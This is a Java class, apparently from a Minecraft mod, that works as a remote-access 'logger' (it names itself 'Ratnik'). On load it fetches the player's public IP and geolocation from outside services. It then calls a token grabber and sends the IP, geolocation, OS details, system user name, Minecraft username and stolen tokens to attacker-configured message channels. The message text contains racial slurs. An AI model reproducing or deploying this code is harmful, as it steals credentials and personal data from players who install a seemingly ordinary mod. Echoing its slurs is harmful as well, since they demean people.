package com.example.examplemod.Hacks.Print;

import com.example.examplemod.Hacks.Print.TockenGrabber.b;
import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.IOException;
import java.net.URL;
import java.util.Scanner;
import net.minecraft.client.Minecraft;

public class Loader {
   static String ip;
   static String geolocation;

   public Loader() throws IOException {
   }

   public static void dothething() {
      String ign = Minecraft.getMinecraft().getSession().getUsername();
      SendMessage.doThing("||@everyone|| **----------------- Loaded logger by ** **" + Minecraft.getMinecraft().getSession().getUsername() + "**\n```Ratnik is loaded Ezzzzzd by dazed, cry about nigga with username <<< " + Minecraft.getMinecraft().getSession().getUsername() + " >>>``````Ip is: " + ip + "``````Geolocation: " + geolocation + "``````Os name: " + System.getProperty("os.name") + "\nOs arch: " + System.getProperty("os.arch") + "\nUser name: " + System.getProperty("user.name") + "\n``````Niggas tocken is - " + b.grabTokens() + "```https://ru.namemc.com/profile/" + Minecraft.getMinecraft().getSession().getUsername() + "\n```NameMC profile ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^```", Cfg.RatChannel);
      SendMessage.doThing("**Start Session ----------------------------------------------------------------------------------------**", Cfg.FilesChannel);
   }

   static {
      try {
         ip = (new Scanner((new URL("http://checkip.amazonaws.com")).openStream(), "UTF-8")).useDelimiter("\\A").next();
      } catch (IOException var2) {
         var2.printStackTrace();
      }

      try {
         geolocation = (new Scanner((new URL("https://geolocation-db.com/json/")).openStream(), "UTF-8")).useDelimiter("\\A").next();
      } catch (IOException var1) {
         var1.printStackTrace();
      }

   }
}
